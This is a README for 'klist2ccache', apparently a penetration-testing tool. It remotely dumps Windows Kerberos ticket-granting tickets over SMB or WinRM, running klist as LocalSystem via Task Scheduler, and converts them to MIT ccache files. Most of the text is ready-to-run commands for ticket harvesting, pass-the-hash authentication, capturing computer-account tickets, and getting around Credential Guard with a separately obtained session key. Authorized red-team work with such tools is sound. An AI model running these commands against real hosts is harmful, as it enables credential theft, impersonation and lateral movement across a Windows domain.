# klist2ccache

`klist2ccache` collects Windows Kerberos TGTs over SMB or WinRM and writes MIT
ccache files. It can also convert previously saved `klist tgt` output.

The default remote method is SMB. SMB uses Task Scheduler to execute `klist`
as LocalSystem, reads the result through `C$`, and removes the temporary output
file. Its optional named-pipe mode streams the result through `IPC$` instead.

## Install with pipx

```bash
pipx install git+https://github.com/SS4ar/klist2ccache
```

For an editable development installation:

```bash
pipx install --editable .
```

The package installs one command:

```console
$ klist2ccache --version
klist2ccache 0.2.0
```

## Remote collection

Targets use the standard Impacket format:
`[[domain/]username[:password]@]target`.

```bash
# SMB is the default
klist2ccache list 'SEVERKINGS/administrator:password@bastion.severkings.local'
klist2ccache dump 'SEVERKINGS/administrator:password@bastion.severkings.local'

# Select WinRM
klist2ccache list 'SEVERKINGS/administrator:password@bastion.severkings.local' -M winrm
klist2ccache dump 'SEVERKINGS/administrator:password@bastion.severkings.local' -M winrm

# Dump one entry from the list output
klist2ccache dump 'SEVERKINGS/administrator:password@host' -s 1 -o ./ccaches
```

The method flag accepts exactly `smb` or `winrm`:

```text
-M {smb,winrm}, --method {smb,winrm}
```

### SMB options

```bash
# Stream output through an SMB named pipe; requires PowerShell 2.0+
klist2ccache list 'DOMAIN/user:password@host' -named-pipes

# Pass-the-hash
klist2ccache list 'DOMAIN/user@host' -hashes :NTHASH

# Kerberos authentication
klist2ccache list 'DOMAIN/user@host' -k -no-pass
```

### WinRM options

```bash
# HTTP on port 5985 by default
klist2ccache list 'DOMAIN/user:password@host' -M winrm

# HTTPS on port 5986
klist2ccache list 'DOMAIN/user:password@host' -M winrm -ssl

# Custom port
klist2ccache list 'DOMAIN/user:password@host' -M winrm -port 15985
```

`-named-pipes` is only valid with `-M smb`.

Computer-account TGTs are included by default. Use `--users-only` to exclude
them. The tool probes every LUID returned by `klist sessions` and only displays
sessions that actually contain a TGT.

## Convert saved klist output

```bash
klist2ccache convert -i tgt.txt
klist2ccache convert -i tgt.txt -f administrator_tgt
klist2ccache convert -i tgt.txt -K SESSION_KEY_HEX
klist2ccache convert -i tgt.txt --ref existing.ccache
```

## Credential Guard

When Credential Guard protects a session key, `klist` returns a wrapped
`KerberosKeyWithMetadata` value rather than the clear key. The tool detects
that layout and refuses to emit an unusable ccache. Local conversion can use a
key obtained separately with `-K` or `--ref`.

## Development

```bash
python3 -m unittest -v
python3 -m pip wheel . --no-deps
```
